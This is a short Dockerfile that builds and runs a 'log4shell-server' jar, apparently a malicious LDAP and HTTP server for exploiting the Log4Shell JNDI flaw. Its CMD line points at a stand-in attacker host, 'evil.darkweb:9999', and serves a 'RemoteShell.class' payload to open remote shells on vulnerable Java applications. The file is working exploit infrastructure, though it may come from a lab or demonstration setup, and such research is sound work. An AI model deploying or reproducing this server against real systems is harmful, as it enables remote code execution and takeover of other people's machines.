FROM maven:3-jdk-8-slim AS build
COPY pom.xml pom.xml
RUN --mount=type=cache,target=/root/.m2 mvn dependency:go-offline -B

COPY src src
RUN --mount=type=cache,target=/root/.m2 mvn clean package

FROM openjdk:8u191-jre-alpine AS ldap
COPY --from=build target/log4shell-server-*-jar-with-dependencies.jar /server.jar
EXPOSE 8000
EXPOSE 9999

CMD ["java", "-jar", "/server.jar", "http://evil.darkweb:9999/#RemoteShell", "8000", "9999", "RemoteShell.class"]

